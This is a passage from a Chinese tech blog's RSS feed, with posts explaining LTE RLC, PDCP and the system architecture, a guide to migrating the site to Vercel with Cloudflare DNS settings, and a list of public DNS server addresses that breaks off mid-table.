<li><code>E1</code>（Extension bit 1）字段指示后面是否跟随有 <code>NACK_SN</code>，<code>E1</code> 和 <code>E2</code> 字段</li>
<li><code>NACK_SN</code>（Negative Acknowledgement SN）字段指示接收错误或者部分出错的 <code>AM PDU</code> 数据包的序列号</li>
<li><code>E2</code>（Extension bit 2）字段指示这个 <code>NACK_SN</code> 后面是否跟随有 <code>SOstart</code> 和 <code>SOend</code> 字段</li>
<li><code>SOstart</code> 在 <code>AM PDU</code> 数据包部分出错的情况下，<code>SOstart</code> 字段指示出错部分的第一个字节在 <code>AM PDU</code> 数据包中的位置</li>
<li><code>SOend</code> 在 <code>AM PDU</code> 数据包部分出错的情况下，<code>SOend</code> 字段指示出错部分的最后一个字节在 <code>AM PDU</code> 数据包中的位置</li>
</ul>
<h3 id="非确认模式um">非确认模式（UM）</h3>
<p>此模式与确认模式的区别是<strong>不进行</strong>错误数据包重传的 <code>ARQ</code> 纠错。<code>UM 模式</code>主要用于对数据传输正确性的要求不是很高的场景，例如广播信道或者 <code>VoIP</code> 业务，包括上下行专用数据逻辑信道和多媒体广播多播业务（Multimedia Broadcast Multicast Service，MBMS）专用的控制和数据逻辑信道。<code>UM 模式</code> <code>RLC 子层</code>仍然执行数据包的连接、分段和重组，数据包的顺序传输和重复性检测的功能。</p>
<p>与 <code>AM 模式</code>相比较，<code>UM 模式</code>的 <code>RLC PUD</code> 少了 3 个字段：<code>D/C</code>、<code>RF</code> 和 <code>P</code>。因为 <code>RLC 控制 PDU</code> 只在 <code>AM 模式</code>进行传输，<code>UM 模式</code>仅传输 <code>RLC 数据 PDU</code>，因此不需要指示 <code>RLC 控制</code>或者 <code>RLC 数据信息</code>的 <code>D/C</code> 字段。<code>UM 模式</code>不进行 <code>ARQ</code> 纠错的重传，因此不会出现数据包重传需要重新分段的情况，所以不需要指示数据分段的 <code>RF</code> 字段。P 字段所指示的 <code>RLC 状态报告</code>也仅适用于 <code>AM 模式</code>，因此 <code>UM 模式</code>的情况下不需要这个字段。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_8.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_8.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_8.webp" data-sub-html="<h2>UM 模式数据消息的 RLC PDU 格式</h2>">
        
    </a><figcaption class="image-caption">UM 模式数据消息的 RLC PDU 格式</figcaption>
    </figure>
<h2 id="参考">参考</h2>
<ul>
<li>[1] LTE-Advanced 关键技术详解</li>
</ul>]]></description>
</item><item>
    <title>LTE 系列：PDCP 层详解</title>
    <link>https://www.techkoala.top/lte_pdcp/</link>
    <pubDate>Mon, 31 Aug 2020 21:00:19 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://www.techkoala.top/lte_pdcp/</guid>
    <description><![CDATA[<blockquote>
<p>LTE PDCP 层详解</p>
</blockquote>
<h2 id="分组数据会聚协议pdcp">分组数据会聚协议（PDCP）</h2>
<p>分组数据会聚协议（Packet Data Convergence Protocol，PDCP）层的主要功能是进行 <code>IP 数据包头压缩</code>、<code>数据加密</code>和<code>控制信令的完整性保护</code>。</p>
<p>对于来自上层的数据包，将针对<strong>每一个</strong>无线承载建立一个 <code>PDCP 实体</code>。首先对数据包进行编号，然后根据配置对数据包进行 <strong>IP 包头压缩</strong>，<strong>数据加密</strong>和<strong>控制信令完整性保护</strong>的操作，形成 <code>PDCP 服务数据单元</code>（Service Data Unit，SDU），最后添加包含编号的 <code>PDCP 包头</code>，形成 <code>PDCP 协议数据单元</code>（Protocol Data Unit，PDU）作为 <code>PDCP</code> 子层协议功能的处理结果向下层 <code>RLC</code> 子层输出。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_3.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_3.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_3.webp" data-sub-html="<h2>PDCP 协议数据单元格式</h2>">
        
    </a><figcaption class="image-caption">PDCP 协议数据单元格式</figcaption>
    </figure>
<ul>
<li><code>R</code> 表示预留的字段，都填充为 <code>0</code></li>
<li><code>D/C</code> 字段指示控制面或者数据面的 <code>PDCP 包</code>，控制面为 <code>0</code>，数据面为 <code>1</code></li>
<li><code>MAC-I</code> 是控制信令完整性保护的字段，在不使用完整性保护功能的时候，都填充为 <code>0</code></li>
</ul>
<h2 id="参考">参考</h2>
<ul>
<li>[1] LTE-Advanced 关键技术详解</li>
</ul>]]></description>
</item><item>
    <title>LTE 系列：无线接入网上层协议</title>
    <link>https://www.techkoala.top/upper_layer_protocol/</link>
    <pubDate>Mon, 31 Aug 2020 16:09:24 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://www.techkoala.top/upper_layer_protocol/</guid>
    <description><![CDATA[<blockquote>
<p>LTE PDCP 协议详解</p>
</blockquote>
<h2 id="无线接入网">无线接入网</h2>
<p>由 E-NodeB 组成的无线接入网是系统与终端用户进行通信的接口，它的功能分为<code>数据面</code>和<code>控制面</code>两个部分：</p>
<ul>
<li><strong>数据面</strong>负责用户数据信息的传输</li>
<li><strong>控制面</strong>负责系统控制功能以及相关信息的传输和处理</li>
</ul>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_1.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_1.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_1.webp" data-sub-html="<h2>LTE 接入网协议架构</h2>">
        
    </a><figcaption class="image-caption">LTE 接入网协议架构</figcaption>
    </figure>
<ul>
<li><a href="https://www.techkoala.top/lte_pdcp/" target="_blank" rel="noopener noreffer">分组数据会聚协议（PDCP）</a></li>
<li><a href="https://www.techkoala.top/lte_rlc/" target="_blank" rel="noopener noreffer">无线链路控制（RLC）</a></li>
<li><a href="https://www.techkoala.top/lte_mac/" target="_blank" rel="noopener noreffer">媒体接入控制（MAC）</a></li>
<li><a href="https://www.techkoala.top/lte_rrc/" target="_blank" rel="noopener noreffer">无线资源控制（RRC）</a></li>
</ul>
<p>无线接入网向核心网提供<strong>无线承载</strong>服务。</p>
<p>针对每一个用户可以建立 1 个或者多个的无线承载，来自核心网 <code>S1</code> 接口的 <code>IP</code> 数据包根据不同的服务质量要求（Quality of Service，QoS）可以映射在不同的无线承载上。然后，数据包将分别经过 <code>PDCP</code>$\Longrightarrow$<code>RLC</code>$\Longrightarrow$<code>MAC</code> 各层协议地处理：</p>
<ul>
<li><code>PDCP</code> 层完成的功能包括 <code>IP</code> 数据包的头压缩、数据加密以及控制信令的完整性保护。</li>
<li><code>RLC</code> 层主要进行自动重传请求（Automatic Repeat Request，ARQ）的功能。</li>
<li><code>MAC</code> 层的主要功能包括动态资源调度、逻辑信道复用以及混合自动重传（Hybrid Automatic Repeat Request，HARQ）。</li>
</ul>
<p>经过 <code>MAC</code> 层协议的处理后，形成 1 个或者多个传输信道。最终通过物理层的处理在无线信号上进行传输。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_2.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_2.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_2.webp" data-sub-html="<h2>LTE 接入网协议功能和数据处理流程</h2>">
        
    </a><figcaption class="image-caption">LTE 接入网协议功能和数据处理流程</figcaption>
    </figure>
<p>控制面主要的控制功能包括：</p>
<ul>
<li>无线接入网的无线资源管理（Radio Resource Control，RRC）。无线资源管理（RRC）的主要功能包括<strong>系统信息的广播</strong>、<strong>终端的移动性管理</strong>，以及<strong>信令和数据的连接控制</strong>。</li>
<li>来自核心网移动性管理实体（MME）的非接入层（NAS）消息的控制功能，包括 <strong>EPS 系统承载</strong>（Evolved Packet System，EPS）的管理，<strong>空闲状态终端的移动性处理和寻呼</strong>，<strong>终端鉴权</strong>以及<strong>安全性</strong>方面的控制。</li>
</ul>
<h2 id="参考">参考</h2>
<ul>
<li>[1] LTE-Advanced 关键技术详解</li>
</ul>]]></description>
</item><item>
    <title>LTE 系列：系统总体架构</title>
    <link>https://www.techkoala.top/the_overall_architecture_of_the_lte_system/</link>
    <pubDate>Mon, 31 Aug 2020 13:17:02 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://www.techkoala.top/the_overall_architecture_of_the_lte_system/</guid>
    <description><![CDATA[<blockquote>
<p>LTE 系统总体架构分解</p>
</blockquote>
<h2 id="系统架构演进">系统架构演进</h2>
<p>系统架构演进（又名 SAE，System Architecture Evolution）是 3GPP 所制定的 LTE 无线通信的核心网络标准。</p>
<p><code>SAE</code> 是基于 <code>GPRS</code> 核心网的演进，其主要差别为：</p>
<ul>
<li>简化架构</li>
<li>全 <code>IP</code> 网络（<code>AIPN</code>）</li>
<li>支持提供更高吞吐量和更低延迟的接入网</li>
<li>多个异构接入网络的互通，包括 <code>E-UTRA</code>（LTE 和 LTE 升级版的接入网），3GPP 已有系统（例如 <code>GPRS</code> 和 <code>UMTS</code> 的接入网 <code>GERAN</code> 和 <code>UTRAN</code>），也支持与非 3GPP 系统之间的互通（例如 <code>WiMAX</code>、<code>CDMA2000</code> 或 <code>WIFI</code>）</li>
</ul>
<p><code>SAE</code> 是的传输使用全 <code>IP</code> 网络，从而支持系统的控制平面和用户平面的分离。</p>
<p><code>SAE</code> 体系结构的主要组成部分是核心分组网演进（EPC，Evolved Packet Core )，也被称为 <code>SAE</code> 核心。<code>EPC</code> 作用与 <code>GPRS</code> 网络相似，包含移动性管理组件（<code>MME</code>），服务网关（<code>S-GW</code>）和 <code>PDN</code> 网关（PDN Gateway）等网元。</p>
<h2 id="系统架构">系统架构</h2>
<p>LTE 系统可以分为<code>核心网</code>和<code>无线接入网</code>两个部分，如下图所示：</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_System_Structure/Structure.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_System_Structure/Structure.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_System_Structure/Structure.webp" data-sub-html="<h2>LTE 系统总体架构图</h2>">
        
    </a><figcaption class="image-caption">LTE 系统总体架构图</figcaption>
    </figure>
<h3 id="核心网">核心网</h3>
<p><strong>核心网</strong>包括：</p>
<ul>
<li>
<p><code>移动性管理实体</code>（MME）</p>
</li>
<li>
<p><code>服务网关</code>（S-GW）</p>
</li>
<li>
<p><code>分组数据网网关</code>（P-GW）</p>
<p><code>MME</code>实体负责移动性管理相关的控制功能，包括：</p>
<ul>
<li>对终端位置跟踪区域列表的管理</li>
<li>对处于空闲状态的终端发起寻呼</li>
<li>为终端选择接入的 <code>P-GW</code> 和 <code>S-GW</code></li>
<li>漫游和鉴权功能</li>
<li>非接入层（Non-Access Stratum，NAS）信令功能</li>
<li>信令安全和接入层（Access Stratum，AS）的安全控制</li>
<li>接入网之间的移动性管理（包括接入网内切换时的 MME 选择，向 2G 或者 3G 的不同接入网切换时的 SGSN 选择）</li>
<li>网络承载管理的功能</li>
</ul>
<p>服务网关（<code>S-GW</code>）负责数据承载的相关功能，包括：</p>
<ul>
<li>数据包的路由和转发，<code>E-NodeB</code> 之间切换或者 <code>E-NodeB</code> 和 <code>GSM/WCDMA/TD-SCDMA</code> 系统的不同接入网之间切换时的数据锚点</li>
<li>上下行传输层数据包的优先级标识</li>
<li>运营商内部和运营商之间的终端计费</li>
<li>对用户通信进行合法侦听的功能</li>
</ul>
<p>PDN 网关（<code>P-GW</code>）是核心网与外部因特网的接口，完成的主要功能包括</p>
<ul>
<li>针对每个用户的数据包过滤</li>
<li>终端的 <code>IP</code> 地址分配</li>
<li>基于业务的计费功能</li>
<li>门控和速率强制功能</li>
<li>下行传输层数据包的优先级标识</li>
<li>进行合法侦听的功能</li>
</ul>
</li>
</ul>
<h3 id="无线接入网">无线接入网</h3>
<p><strong>无线接入网</strong>是系统与移动用户终端进行通信的接口，LTE 无线接入网采用扁平的网络结构，仅包含一种网络节点，即 <code>E-NodeB</code>（LTE 基站）：</p>
<ul>
<li>
<p><code>E-NodeB</code> 之间通过 <code>X2</code> 接口进行互连，<code>E-NodeB</code> 通过 <code>S1</code> 接口与核心网进行连接，分为 <code>S1-MME</code> 和 <code>S1-U</code> 接口分别与核心网的 <code>MME</code> 和 <code>S-GW</code> 设备进行连接。为了实现负荷分担和容灾备份的功能，<code>E-NodeB</code> 和 <code>MME/S-GW</code> 之间可以进行多对多的连接，即 1 个 <code>MME/S-GW</code> 可以和多个 <code>E-NodeB</code> 连接，1 个 <code>E-NodeB</code> 也可以和多个 <code>MME/S-GW</code> 连接。</p>
</li>
<li>
<p><code>E-NodeB</code> 负责无线接入网部分的功能，主要包括：无线资源管理（包括无线承载控制、无线接入控制、连接的移动性控制、动态的资源调度），<code>IP</code> 头压缩和用户数据加密，为附着的终端选择进行控制功能的 <code>MME</code> 实体，将用户数据路由至 <code>S-GW</code> 服务网关，寻呼、广播和公共报警消息的调度与传输，以及配置用于终端移动性管理和数据调度的物理层信号测量和测量的上报。<code>E-NodeB</code> 之间通过 <code>X2</code> 接口进行互连，<code>X2</code> 接口主要用于支持终端在 <code>E-NodeB</code> 之间的切换，包括信令的交互以及切换过程中可能进行的数据转发，<code>X2</code> 接口还可以用于在小区之间交互无线资源管理的消息，实现小区间协调进行干扰抑制的功能。</p>
</li>
</ul>
<h2 id="参考">参考</h2>
<ul>
<li>
<p>[1] <a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E6%BC%94%E8%BF%9B" target="_blank" rel="noopener noreffer">SAE</a></p>
</li>
<li>
<p>[2] LTE-Advanced 关键技术详解</p>
</li>
</ul>]]></description>
</item><item>
    <title>全站迁移到 Vercel</title>
    <link>https://www.techkoala.top/migrated_to_vercel/</link>
    <pubDate>Wed, 26 Aug 2020 16:18:53 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://www.techkoala.top/migrated_to_vercel/</guid>
    <description><![CDATA[<blockquote>
<p>加速访问！</p>
</blockquote>
<h2 id="when">When</h2>
<p>网站已于 2020-8-26 迁移至 <a href="https://vercel.com" target="_blank" rel="noopener noreffer">vercel</a></p>
<h2 id="why">Why</h2>
<p>鉴于目前 Github 以及 Cloudflare 在国内的访问速度一日不如一日，所以开始寻找了替代服务。刚好有 V2er 发帖求助相同的需求，于是顺着<a href="https://www.v2ex.com/t/701487" target="_blank" rel="noopener noreffer">帖子</a>的推荐选择了 Vercel。</p>
<h2 id="what">What</h2>
<p>下面是 Vercel 官网的介绍：</p>
<blockquote>
<p>Vercel is a cloud platform for <strong>static sites</strong> and <strong>Serverless Functions</strong> that fits perfectly with your workflow. It enables developers to host <strong>Jamstack</strong> websites and web services that <strong>deploy instantly</strong>, <strong>scale automatically</strong>, and requires <strong>no supervision</strong>, all with <strong>no configuration</strong>.</p>
</blockquote>
<p>相比于 Github Pages、Netlify 等，Vercel 拥有台湾和香港节点，对国内用户更加友好。并且小流量情况免费套餐足够使用了。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Web/Vercel/vercel.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Web/Vercel/vercel.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Web/Vercel/vercel.webp" data-sub-html="<h2>Vercel</h2>">
        
    </a><figcaption class="image-caption">Vercel</figcaption>
    </figure>
<h2 id="how">How</h2>
<p>此前，本网站是托管在 Github Pages,然后通过 Clouflare 进行代理访问，因此只需要在 Cloudfalre 原配置上就行修改即可。</p>
<ol>
<li>首先，直接使用 Github 账号（或 Gitlab 等）登录 Vercel 即可（<strong>注：</strong> 不可以使用 QQ 邮箱为主邮箱的 Github 账号，Vercel 不识别部分邮箱域名，如果你是，请到 Github 修改主邮箱）</li>
</ol>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Web/Vercel/import.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Web/Vercel/import.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Web/Vercel/import.webp" data-sub-html="<h2>导入 Github 项目</h2>">
        
    </a><figcaption class="image-caption">导入 Github 项目</figcaption>
    </figure>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Web/Vercel/import2.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Web/Vercel/import2.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Web/Vercel/import2.webp" data-sub-html="<h2>选择需要导入的文件夹，默认为根文件夹</h2>">
        
    </a><figcaption class="image-caption">选择需要导入的文件夹，默认为根文件夹</figcaption>
    </figure>
<ol start="2">
<li>完成导入后，配置你的预编译设置（由于本站是在本地使用 Hugo 编译好后 push 到 Github 上的所以这里选择 Other，然后勾选 OVERRIDE，不填写编译内容，表示不需要进行编译）如果你想要 Vercel 代替你编译，可以在这里选择相应的配置。</li>
</ol>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Web/Vercel/build.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Web/Vercel/build.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Web/Vercel/build.webp" data-sub-html="<h2>编译选项</h2>">
        
    </a><figcaption class="image-caption">编译选项</figcaption>
    </figure>
<ol start="3">
<li>待你完成编译配置后，等待 Vercel 完成编译和部署，你就可以得到一个可以访问的网站了，当然域名是一个二级域名。接下来我们配置自定义域名，首先点击你的项目，进入 设置 &gt; 域名。然后添加你的域名，一开始你添加好的域名不会和图片上一样，会显示为正确配置，这是因为我们还需要到 Cloudflare 进行调整。</li>
</ol>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Web/Vercel/domain.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Web/Vercel/domain.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Web/Vercel/domain.webp" data-sub-html="<h2>域名设置</h2>">
        
    </a><figcaption class="image-caption">域名设置</figcaption>
    </figure>
<ol start="4">
<li>
<p>来到 Cloudflare 的 DNS 配置页面，首先删除此前指向 Github Pages 的两个解析，然后添加一个<code>CNAME</code>类型的解析，设置名字设置为<code>www</code>,内容填入<code>cname.vercel-dns.com</code>；</p>
<p><strong>注：</strong> 关键一步是，这里一定要设置<code>Proxy Status</code>为<code>DNS only</code>，否则，你的网站依然会经过 Cloudflare 的代理来访问。</p>
</li>
</ol>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Web/Vercel/cloudflare.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Web/Vercel/cloudflare.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Web/Vercel/cloudflare.webp" data-sub-html="<h2>Cloudflare DNS 配置</h2>">
        
    </a><figcaption class="image-caption">Cloudflare DNS 配置</figcaption>
    </figure>
<blockquote>
<p>这里我还添加一个 A 记录指向<code>76.76.21.21</code>，因为我默认将根域名跳转到<code>www</code>。这个根据实际情况决定，但同样记得设置设置<code>Proxy Status</code>为<code>DNS only</code>。</p>
</blockquote>
<h2 id="参考">参考</h2>
<ul>
<li>[1] <a href="https://vercel.com/docs/introduction" target="_blank" rel="noopener noreffer">Introduction to Vercel</a></li>
</ul>]]></description>
</item><item>
    <title>DNS 列表</title>
    <link>https://www.techkoala.top/dns_list/</link>
    <pubDate>Fri, 21 Aug 2020 18:44:20 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://www.techkoala.top/dns_list/</guid>
    <description><![CDATA[<blockquote>
<p>列举国内外常用的 DNS</p>
</blockquote>
<h2 id="ipv4">IPv4</h2>
<h3 id="国内">国内</h3>
<h4 id="知名-dns-服务">知名 DNS 服务</h4>
<table>
<thead>
<tr>
<th>名称</th>
<th>IP 地址（首选）</th>
<th>IP 地址（备选）</th>
</tr>
</thead>
<tbody>
<tr>
<td>114 常规 DNS</td>
<td>114.114.114.114</td>
<td>114.114.115.115</td>
</tr>
<tr>
<td>114 拦截钓鱼病毒木马网站</td>
<td>114.114.114.119</td>
<td>114.114.115.119</td>
</tr>
<tr>
<td>114 拦截色情网站</td>
<td>114.114.114.110</td>
<td>114.114.115.110</td>
</tr>
<tr>
<td>阿里 AliDNS</td>
<td>223.5.5.5</td>
<td>223.6.6.6</td>
</tr>
<tr>
<td>百度 BaiduDNS</td>
<td>180.76.76.76</td>
<td></td>
</tr>
<tr>
<td>DNSPod DNS+</td>
<td>119.29.29.29</td>
<td>182.254.116.116</td>
</tr>
<tr>
<td>CNNIC SDNS</td>
<td>1.2.4.8</td>
<td>210.2.4.8</td>
</tr>
<tr>
<td>oneDNS</td>
<td>117.50.11.11</td>
<td>52.80.66.66</td>
</tr>
<tr>
<td>DNS 派电信/移动/铁通</td>
<td>101.226.4.6</td>
<td>218.30.118.6</td>
</tr>
<tr>
<td>DNS 派联通</td>
<td>123.125.81.6</td>
<td>140.207.198.6</td>
</tr>
</tbody>
</table>
<h4 id="全国各地电信-dns-服务器-ip-地址">全国各地电信 DNS 服务器 IP 地址</h4>
<table>
<thead>
<tr>
<th>名称</th>
<th>IP 地址（首选）</th>
<th>IP 地址（备选）</th>
</tr>
</thead>
<tbody>
<tr>
<td>安徽电信 DNS</td>
<td>61.132.163.68</td>
<td>202.102.213.68</td>
</tr>
<tr>
<td>北京电信 DNS</td>
<td>219.141.136.10</td>
<td>219.141.140.10</td>
</tr>
<tr>
<td>重庆电信 DNS</td>
<td>61.128.192.68</td>
<td>61.128.128.68</td>
</tr>
<tr>
<td>福建电信 DNS</td>
<td>218.85.152.99</td>
<td>218.85.157.99</td>
</tr>
<tr>
<td>甘肃电信 DNS</td>
<td>202.100.64.68</td>
<td>61.178.0.93</td>
</tr>
<tr>
<td>广东电信 DNS</td>
<td>202.96.128.86</td>
<td>202.96.128.166</td>
</tr>
<tr>
<td></td>
<td>202.96.134.33</td>
<td>202.96.128.68</td>
</tr>
<tr>
<td>广西电信 DNS</td>
<td>202.103.225.68</td>
<td>202.103.224.68</td>
</tr>
<tr>
<td>贵州电信 DNS</td>
<td>202.98.192.67</td>
<td>202.98.198.167</td>
</tr>
<tr>
<td>河南电信 DNS</td>
<td>222.88.88.88</td>
<td>222.85.85.85</td>
</tr>
<tr>
<td>黑龙江电信</td>
<td>219.147.198.230</td>
<td>219.147.198.242</td>
</tr>
<tr>
<td>湖北电信 DNS</td>
<td>202.103.24.68</td>
<td>202.103.0.68</td>
</tr>
<tr>
<td>湖南电信 DNS</td>
<td>222.246.129.80</td>
<td>59.51.78.211</td>
</tr>
<tr>
<td>江苏电信 DNS</td>
<td>218.2.2.2</td>
<td>218.4.4.4</td>
</tr>
<tr>
<td></td>
<td>61.147.37.1</td>
<td>218.2.135.1</td>
</tr>
<tr>
<td>江西电信 DNS</td>
<td>202.101.224.69</td>
<td>202.101.226.68</td>
</tr>
<tr>
<td>内蒙古电信</td>
<td>219.148.162.31</td>
<td>222.74.39.50</td>
</tr>
<tr>
<td>山东电信 DNS</td>
<td>219.146.1.66</td>
<td>219.147.1.66</td>
</tr>
<tr>
<td>陕西电信 DNS</td>
<td>218.30.19.40</td>
<td>61.134.1.4</td>
</tr>
<tr>
<td>上海电信 DNS</td>
<td>202.96.209.133</td>
<td>116.228.111.118</td>
</tr>
<tr>
<td></td>
<td>202.96.209.5</td>
<td>180.168.255.118</td>
</tr>
<tr>
<td>四川电信 DNS</td>
<td>61.139.2.69</td>
<td>218.6.200.139</td>
</tr>
<tr>
<td>天津电信 DNS</td>
<td>219.150.32.132</td>
<td>219.146.0.132</td>
</tr>
<tr>
<td>云南电信 DNS</td>
<td>222.172.200.68</td>
<td>61.166.150.123</td>
</tr>
<tr>
<td>浙江电信 DNS</td>
<td>202.101.172.35</td>
<td>61.153.177.196</td>
</tr>
<tr>
<td></td>
<td>61.153.81.75</td>
<td>60.191.244.5</td>
</tr>
</tbody>
</table>
<h4 id="全国各地联通-dns-服务器-ip-地址">全国各地联通 DNS 服务器 IP 地址</h4>
<table>
<thead>
<tr>
<th>名称</th>
<th>IP 地址（首选）</th>
<th>IP 地址（备选）</th>
</tr>
</thead>
<tbody>
<tr>
<td>北京联通 DNS</td>
<td>123.123.123.123</td>
<td>123.123.123.124</td>
</tr>
<tr>
<td></td>
<td>202.106.0.20</td>
<td>202.106.195.68</td>
</tr>
<tr>
<td>重庆联通 DNS</td>
<td>221.5.203.98</td>
<td>221.7.92.98</td>
</tr>
<tr>
<td>广东联通 DNS</td>
<td>210.21.196.6</td>
<td>221.5.88.88</td>
</tr>
<tr>
<td>河北联通 DNS</td>
<td>202.99.160.68</td>
<td>202.99.166.4</td>
</tr>
<tr>
<td>河南联通 DNS</td>
<td>202.102.224.68</td>
<td>202.102.227.68</td>
</tr>
<tr>
<td>黑龙江联通</td>
<td>202.97.224.69</td>
<td>202.97.224.68</td>
</tr>
<tr>
<td>吉林联通 DNS</td>
<td>202.98.0.68</td>
<td>202.98.5.68</td>
</tr>
<tr>
<td>江苏联通 DNS</td>
<td>221.6.4.66</td>
<td>221.6.4.67</td>
</tr>
<tr>
<td>内蒙古联通</td>
<td>202.99.224.68</td>
<td>202.99.224.8</td>
</tr>
<tr>
<td>山东联通 DNS</td>
<td>202.102.128.68</td>
<td>202.102.152.3</td>
</tr>
<tr>
<td></td>
<td>202.102.134.68</td>
<td>202.102.154.3</td>
</tr>
<tr>
<td>山西联通 DNS</td>
<td>202.99.192.66</td>
<td>202.99.192.68</td>
</tr>
<tr>
<td>陕西联通 DNS</td>
<td>221.11.1.67</td>
<td>221.11.1.68</td>
</tr>
<tr>
<td>上海联通 DNS</td>
<td>210.22.70.3</td>
<td>210.22.84.3</td>
</tr>
<tr>
<td>四川联通 DNS</td>
<td>119.6.6.6</td>
<td>124.161.87.155</td>
</tr>
<tr>
<td>天津联通 DNS</td>
<td>202.99.104.68</td>
<td>202.99.96.68</td>
</tr>
<tr>
<td>浙江联通 DNS</td>
<td>221.12.1.227</td>
<td>221.12.33.227</td>
</tr>
<tr>
<td>辽宁联通 DNS</td>
<td>202.96.69.38</td>
<td>202.96.64.68</td>
</tr>
</tbody>
</table>
<h4 id="全国各地移动-dns-服务器-ip-地址">全国各地移动 DNS 服务器 IP 地址</h4>
<table>
<thead>
<tr>
<th>名称</th>
<th>IP 地址（首选）</th>
<th>IP 地址（备选）</th>
</tr>
</thead>
<tbody>
<tr>
<td>江苏移动 DNS</td>
<td>221.131.143.69</td>
<td>112.4.0.55</td>
</tr>
<tr>
<td>安徽移动 DNS</td>
<td>211.138.180.2</td>
<td>211.138.180.3</td>
</tr>
<tr>
<td>山东移动 DNS</td>
<td>218.201.96.130</td>
<td>211.137.191.26</td>
</tr>
</tbody>
</table>
<h3 id="香港地区">香港地区</h3>
<table>
<thead>
<tr>
<th>名称</th>
<th>IP 地址（首选）</th>
<th>IP 地址（备选）</th>
</tr>
</thead>
<tbody>
<tr>
<td>香港宽频 DNS</td>
<td>203.80.96.10</td>
<td></td>
</tr>
<tr>
<td>和记环球电讯 DNS</td>
<td>202.45.84.58</td>
<td>202.45.84.59</td>
</tr>
<tr>
<td>Pacific SuperNet DNS</td>
<td>202.14.67.4</td>
<td>202.14.67.14</td>
</tr>
</tbody>
</table>
<h3 id="台湾地区">台湾地区</h3>
<table>
<thead>
<tr>
<th>名称</th>
<th>IP 地址（首选）</th>
<th>IP 地址（备选）</th>
</tr>
</thead>
<tbody>
<tr>
<td>中华电信 DNS</td>
<td>168.95.1.1</td>
<td>168.95.192.1</td>
</tr>
<tr>
<td>数位联合电信 DNS</td>
<td>139.175.252.16</td>
<td>139.175.55.244</td>
</tr>
<tr>
<td>台湾网路资讯</td>
<td>101.101.101.101</td>
<td>101.102.103.104</td>
</tr>
</tbody>
</table>
<h3 id="韩国">韩国</h3>
<table>
<thead>
<tr>
<th>名称</th>
<th>IP 地址（首选）</th>
<th>IP 地址（备选）</th>
</tr>
</thead>
<tbody>
<tr>
